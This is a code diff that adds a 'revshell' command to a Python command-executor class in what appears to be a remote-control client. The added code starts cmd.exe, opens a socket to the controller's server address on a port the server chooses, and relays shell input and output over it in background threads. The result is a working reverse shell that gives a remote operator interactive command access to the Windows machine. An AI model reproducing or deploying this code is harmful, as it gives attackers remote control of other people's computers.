@@ -5,10 +5,12 @@ import inspect
 import io
 import json
 import os
+import socket
 import subprocess
 import threading
 import time
 
+from client.config.config import SERVER_ADDR
 from client.util.decorator import desc, params, enclosing, require_admin, require_integrity
 from client.util.reflection_util import get_main_class
 from common.util import logger, get_time, format_dict, parse, get_size
@@ -260,6 +262,33 @@ class CommandExecutor:
             return 1, 'Interrupt signal sent'
         else:
             return 0, 'The module has not been imported'
+
+    @desc('start a interactive reverse shell')
+    def revshell(self, arg):
+        self.send_to_server(1, 'Reverse shell thread being started', 1)
+
+        p = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+
+        s = socket.socket()
+        s.connect((SERVER_ADDR[0], int(arg.strip())))
+
+        def send():
+            while p.poll() is None:
+                o = os.read(p.stdout.fileno(), 1024)
+                s.send(o)
+            logger.info('Sending thread has been terminated')
+            s.close()
+
+        def recv():
+            try:
+                while 1:
+                    i = s.recv(1024)
+                    os.write(p.stdin.fileno(), i)
+            finally:
+                logger.info('Receiving thread has been terminated')
+
+        threading.Thread(target=send, daemon=True).start()
+        threading.Thread(target=recv).start()
 
     @desc('get information')
     def getinfo(self):
